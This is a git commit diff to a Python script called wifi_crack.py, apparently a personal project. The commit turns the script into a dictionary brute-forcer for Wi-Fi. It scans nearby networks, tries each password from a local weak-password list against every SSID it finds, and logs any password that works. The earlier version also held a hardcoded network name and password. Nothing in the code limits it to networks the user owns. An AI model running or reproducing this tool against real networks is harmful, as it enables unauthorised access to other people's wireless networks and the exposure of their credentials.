72b2c811a7836cb65c9cdcdb0770d56ed4868c10
Rockyzsu <jinweizsu@gmail.com>
2019-09-10 20:52:27 +0800

    update

--- wifi_crack.py
+++ wifi_crack.py
@@ -3,38 +3,71 @@ import time
 from pywifi import const
 import pywifi
 from Base import BaseServices
+
+DEFAULT = 2
+
 class WIFI(BaseServices):
 
     def __init__(self):
         self.logger = self.get_lloger()
         self.wifi=pywifi.PyWiFi()
         self.iface = self.wifi.interfaces()[0]
+        self.password_list = self.get_password()
+        self.ignore_list=['printer','printers','liubing_5G']
+    def get_password(self):
+        
+        password_list=[]
+        path = r'C:\git\workspace\weak_dict.txt'
+        with open(path,'r') as f:
+            password_list = f.readlines()
+
+        return password_list
 
     def start(self):
-        username='printer'
-        password='zxcvbnm0'
-        basewifi = self.scan()
 
+        basewifi = self.scan(10)
+
+        if self.wifi_connect_status:
+            # 断开
+            # self.disconnect()
+            pass
+        
+        print(len(basewifi))
+        ssid_list = []
         for i in basewifi:
-            print('wifi 扫描结果：{}'.format(i.ssid))
-            print('wifi 对应设备的MAC地址: {}'.format(i.bssid))
+            print(i.ssid)
+            ssid_list.append(i.ssid)
+        
+        ssid_set = set(ssid_list)
+        
+        for i in ssid_set:
+            if i in self.ignore_list:
+                continue
+            print('wifi 扫描结果：{}'.format(i))
+            print('wifi 对应设备的MAC地址: {}'.format(i))
             print('='*10)
+     
+            for p in self.password_list:
+                
+                if self.connect(i,p.strip()):
+                    break
+                else:
+                    pass
 
             
-
     def wifi_connect_status(self):
             if self.iface.status() in [const.IFACE_CONNECTED,const.IFACE_INACTIVE]:
                 return True
             else:
                 return False
 
-    def scan(self):
+    def scan(self,sleep_time=DEFAULT):
         self.iface.scan()
-        time.sleep(3)
+        time.sleep(sleep_time)
         basewifi = self.iface.scan_results()
         return basewifi
 
-    def connect(self,ssid,password,sleep_time=3):
+    def connect(self,ssid,password,sleep_time=DEFAULT):
         profile = pywifi.Profile()
         profile.ssid=ssid
         profile.auth=const.AUTH_ALG_OPEN
@@ -47,7 +80,7 @@ class WIFI(BaseServices):
 
         time.sleep(sleep_time)
 
-        if self.wifi_connect_status:
+        if self.wifi_connect_status():
 
             self.logger.info(f'{ssid} 连接成功')
             self.logger.info(f'{ssid}的密码是{password}')
@@ -57,12 +90,13 @@ class WIFI(BaseServices):
             # print('连接失败')
             return False
 
-    def disconnect(self,sleep_time):
+    def disconnect(self,sleep_time=DEFAULT):
         self.iface.disconnect()
         time.sleep(sleep_time)
 
 if __name__ == "__main__":
     wifi = WIFI()
     # wifi.scan()
-    wifi.disconnect()
-    wifi.connect()
+    # wifi.disconnect()
+    # wifi.connect()
+    wifi.start()
